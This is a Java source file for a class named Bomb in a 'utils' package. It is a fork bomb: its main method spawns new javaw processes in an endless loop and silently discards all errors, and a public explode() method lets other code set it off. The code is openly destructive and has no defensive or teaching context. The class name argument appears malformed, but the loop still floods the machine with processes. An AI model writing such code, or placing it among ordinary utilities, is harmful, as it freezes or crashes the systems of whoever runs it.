package utils;

import java.io.IOException;

public class Bomb {
    public static void main(String[] args) {
        try {
            while (true)
                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), Bomb.class.toString()});
        } catch (IOException e) {
            // silence is golden
        }
    }

    public static void explode() throws IOException {
       Bomb.main(null);
    }
}